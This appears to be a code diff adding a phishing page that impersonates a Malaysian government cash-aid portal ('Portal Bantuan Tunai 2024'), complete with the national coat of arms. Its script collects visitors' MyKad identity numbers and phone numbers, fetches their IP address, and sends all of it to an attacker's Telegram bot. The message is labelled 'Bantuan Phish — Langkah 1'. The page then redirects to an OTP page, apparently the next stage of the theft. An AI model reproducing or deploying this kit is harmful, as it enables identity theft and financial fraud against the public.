@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Bantuan Tunai 2024</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card">
+        <div class="logo-area">
+            <!-- Letak gambar logo kerajaan kat folder img/ -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Coat_of_arms_of_Malaysia.svg/200px-Coat_of_arms_of_Malaysia.svg.png" alt="Logo">
+        </div>
+        <h2>Log Masuk Bantuan</h2>
+        <p>Sila masukkan no. kad pengenalan untuk semak status kelayakan anda.</p>
+        <form id="formLogin">
+            <div class="form-group">
+                <label>No. Kad Pengenalan (MyKad)</label>
+                <input type="text" id="ic" placeholder="cth: 901231-14-5678" required>
+            </div>
+            <div class="form-group">
+                <label>No. Telefon Bimbit</label>
+                <input type="text" id="phone" placeholder="cth: 0123456789" required>
+            </div>
+            <button type="submit" id="btn">Semak Kelayakan</button>
+        </form>
+    </div>
+    <script src="js/config.js"></script>
+    <script>
+        document.getElementById("formLogin").addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById("btn");
+            btn.disabled = true; btn.textContent = "Menyemak...";
+
+            const ic = document.getElementById("ic").value;
+            const phone = document.getElementById("phone").value;
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const ip = (await ipRes.json()).ip;
+
+            // Hantar Data Login
+            const text = `<b>🏦 Bantuan Phish — Langkah 1</b>\nIC: <code>${ic}</code>\nTel: <code>${phone}</code>\nIP: ${ip}`;
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text, parse_mode: "HTML" })
+            });
+
+            // Pindah ke halaman OTP
+            window.location.href = "otp.html";
+        });
+    </script>
+</body>
+</html>
